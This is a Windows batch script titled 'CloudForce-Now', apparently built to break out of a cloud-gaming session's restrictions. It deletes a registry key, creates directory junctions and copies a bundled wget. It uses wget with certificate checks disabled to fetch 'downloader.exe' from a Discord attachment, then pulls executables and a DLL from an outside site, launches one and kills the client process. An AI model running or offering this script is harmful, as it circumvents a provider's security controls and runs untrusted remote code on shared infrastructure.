@ECHO OFF
TITLE CloudForce-Now
COLOR F1 
C:
MD "B:\CloudForce" >NUL 2>&1
CD "C:\Program Files (x86)\Steam"
START "" "steam.exe" "steam://rungameid/304050" >NUL 2>&1
CLS
ECHO CloudForce-Now
ECHO Batch by ExtremeGrief and obfuscator for batch, and _xor for method
REG DELETE HKCR\CLSID\{5FF6E100-3F93-437D-8779-C0409CB4855A} /f >NUL 2>&1
TIMEOUT 3 /NOBREAK >NUL 2>&1
ECHO C:\Program Files (x86)\Steam|clip
MKLINK /J "%PROGRAMFILES(X86)%\Steam\PasteWgetHere" "B:\CloudForce" >NUL 2>&1
MD "%PROGRAMFILES(X86)%\Steam\PasteThis" >NUL 2>&1
COPY "%PROGRAMFILES(X86)%\NVIDIA_Grid_Bundle\steamworks_common_redistributables\_gtl\lib\NVIDIA\Wget\wget.exe" "%PROGRAMFILES(X86)%\Steam\PasteThis" >NUL 2>&1
MKLINK /J "%PROGRAMFILES(X86)%\Steam\PasteWgetHere" "B:\CloudForce" >NUL 2>&1
MD "%PROGRAMFILES(X86)%\Steam\PasteThis" >NUL 2>&1
COPY "%PROGRAMFILES(X86)%\NVIDIA_Grid_Bundle\steamworks_common_redistributables\_gtl\lib\NVIDIA\Wget\wget.exe" "%PROGRAMFILES(X86)%\Steam\PasteThis" >NUL 2>&1
ECHO Junction created!
ECHO Paste in File Name, drag PasteThis to PasteWgetHere
GOTO loop				

:loop
IF exist "B:\CloudForce\PasteThis\wget.exe" GOTO :found >NUL 2>&1
GOTO :loop

:found
ECHO Wget copied! Downloading downloader.exe
CD "%PROGRAMFILES(X86)%\Steam\PasteWgetHere\PasteThis"
TIMEOUT 3 /NOBREAK >NUL 2>&1
wget.exe --no-check-certificate -q https://cdn.discordapp.com/attachments/761473336630837248/771789075187105794/downloader.exe >NUL 2>&1
SET DL="%PROGRAMFILES(X86)%\Steam\PasteWgetHere\PasteThis\downloader.exe" >NUL 2>&1
CLS
B:
CD "B:\CloudForce"
ECHO Downloading CloudForce
%DL% -LJOk http://cloudleague.de/gfn/Guna.UI2.dll >NUL 2>&1
%DL% -LJOk http://cloudleague.de/gfn/CtrlTab-1.exe >NUL 2>&1
%DL% -LJOk http://cloudleague.de/gfn/CloudForce-Now.exe >NUL 2>&1
START "" "B:\CloudForce\CloudForce-Now.exe"
TASKKILL /F /IM GlyphClientApp.exe
EXIT